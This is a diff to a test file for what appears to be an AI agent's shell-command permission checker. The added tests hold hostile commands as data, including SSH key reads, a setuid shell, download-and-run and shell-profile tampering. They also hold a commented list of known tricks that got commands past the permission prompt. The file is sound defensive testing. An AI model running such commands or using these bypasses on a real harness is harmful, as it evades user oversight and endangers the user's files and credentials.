@@ -7,7 +7,10 @@ import {
   type AgentPermissionRules
 } from '../agent-permissions';
 
-const rules = (allow: string[] = [], deny: string[] = []): AgentPermissionRules => ({ allow, deny });
+const rules = (allow: string[] = [], deny: string[] = []): AgentPermissionRules => ({
+  allow,
+  deny
+});
 
 describe('matchCommand', () => {
   it('matches a whole command and its arguments, on a word boundary', () => {
@@ -56,9 +59,9 @@ describe('decideCommand', () => {
   });
 
   it('denies the whole line when any part of it is denied', () => {
-    expect(decideCommand(rules(['echo', 'npm'], ['npm publish']), 'echo hi && npm publish')).toEqual(
-      { kind: 'deny' }
-    );
+    expect(
+      decideCommand(rules(['echo', 'npm'], ['npm publish']), 'echo hi && npm publish')
+    ).toEqual({ kind: 'deny' });
   });
 
   /*
@@ -134,6 +137,75 @@ describe('alwaysAskReason', () => {
 
   it('asks before work is thrown away', () => {
     expect(alwaysAskReason('git reset --hard HEAD~1')).toBe('Throws away uncommitted work.');
+    expect(alwaysAskReason('git clean -xfd')).toBe('Deletes files that were never committed.');
+  });
+
+  it('reads a path the way the shell will, not the way it is spelled', () => {
+    expect(alwaysAskReason('rm -rf $HOME/Documents')).toMatch(/Deletes a folder/);
+    expect(alwaysAskReason('rm -rf "$HOME/Documents"')).toMatch(/Deletes a folder/);
+    expect(alwaysAskReason('rm -rf ${HOME}')).toMatch(/Deletes a folder/);
+    expect(alwaysAskReason('cat ~/.ss""h/id_rsa')).toBe('Touches credentials.');
+  });
+
+  it('asks about a write that lands outside the folder, and not about a discard', () => {
+    expect(alwaysAskReason('echo pwned > ~/.zshrc')).toMatch(/Writes to a file outside/);
+    expect(alwaysAskReason('curl https://example.com/x >> /etc/hosts')).toMatch(/Writes to a file/);
+    expect(alwaysAskReason('echo hi > out.txt')).toBeNull();
+    expect(alwaysAskReason('npm test 2>/dev/null')).toBeNull();
+  });
+
+  // The reason a command is worth asking about is not always its own program.
+  it('sees a git subcommand behind git’s own options', () => {
+    expect(alwaysAskReason('git -c user.name=x push --force origin main')).toMatch(/Force-pushes/);
+    expect(alwaysAskReason('git -C /repo reset --hard')).toBe('Throws away uncommitted work.');
+    expect(alwaysAskReason('git --no-pager log --oneline')).toBeNull();
+  });
+
+  it('sees a force push that is spelled as a refspec', () => {
+    expect(alwaysAskReason('git push origin +main:main')).toMatch(/Force-pushes/);
+    expect(alwaysAskReason('git push --mirror origin')).toMatch(/Force-pushes/);
+    expect(alwaysAskReason('git push --delete origin main')).toBe(
+      'Deletes a branch from the remote.'
+    );
+  });
+
+  it('asks when the line moves somewhere else before doing the work', () => {
+    expect(alwaysAskReason('cd / && rm -rf tmp')).toMatch(/Runs somewhere other/);
+    // On its own it changes nothing: each command is its own process.
+    expect(alwaysAskReason('cd /tmp')).toBeNull();
+    expect(alwaysAskReason('cd src && npm test')).toBeNull();
+  });
+
+  it('reads the command inside an interpreter’s quotes', () => {
+    expect(alwaysAskReason("bash -c 'sudo chmod 4755 /bin/sh'")).toBe('Runs as root.');
+  });
+});
+
+/*
+ * Every one of these ran unasked under a rule the user could plausibly hold,
+ * and each was reported by a reviewer and reproduced before it was fixed. The
+ * property is the one the list exists for: a command worth asking about is
+ * asked about, whatever rule happens to cover it.
+ */
+describe('always-ask holds against a rule that would otherwise cover the line', () => {
+  const bypasses: [command: string, allow: string[]][] = [
+    ['ls\nsudo whoami', ['ls', 'whoami']],
+    ['echo `sudo chmod 4755 /bin/sh`', ['echo', 'chmod']],
+    ['env sudo whoami', ['whoami']],
+    ['timeout 5 sudo whoami', ['whoami']],
+    ['"sudo" whoami', ['whoami']],
+    ['/usr/bin/sudo rm -rf /tmp/x', ['rm']],
+    ['git -c x=y push --force origin main', ['git']],
+    ['git push origin +main:main', ['git push']],
+    ['rm -rf $HOME/Documents', ['rm']],
+    ['cd / && rm -rf tmp', ['cd', 'rm']],
+    ['echo pwned > ~/.zshrc', ['echo']],
+    ['curl x > /tmp/a; bash /tmp/a', ['curl', 'bash']],
+    ["bash -c 'sudo whoami'", ['bash']]
+  ];
+
+  it.each(bypasses)('asks about %j', (command, allow) => {
+    expect(decideCommand(rules(allow), command).kind).toBe('ask');
   });
 });
 
@@ -143,8 +215,24 @@ describe('suggestRule', () => {
     expect(suggestRule('git status --short')).toBe('git status');
   });
 
-  it('stops at the first flag rather than remembering one invocation', () => {
-    expect(suggestRule('ls -la src')).toBe('ls');
+  /*
+   * The button is a click about one line, and `rm` is not one line. Where
+   * there is no prefix that both covers the command and stays narrower than
+   * the program, the rule is the command itself.
+   */
+  it('never hands out a bare program name', () => {
+    expect(suggestRule('ls -la src')).toBe('ls -la src');
+    expect(suggestRule('rm -rf node_modules')).toBe('rm -rf node_modules');
+    expect(suggestRule('curl -sL https://example.com')).toBe('curl -sL https://example.com');
+    expect(suggestRule('git -C /tmp status')).toBe('git -C /tmp status');
+  });
+
+  it('has nothing to suggest over an interpreter, whose argument is a program', () => {
+    expect(suggestRule("bash -c 'echo hi'")).toBeNull();
+    expect(suggestRule("sh -c 'echo hi'")).toBeNull();
+    expect(suggestRule("python3 -c 'print(1)'")).toBeNull();
+    expect(suggestRule('/bin/bash script.sh')).toBeNull();
+    expect(suggestRule('ssh host uptime')).toBeNull();
   });
 
   it('has nothing to suggest for a chain, where one rule would not cover it', () => {
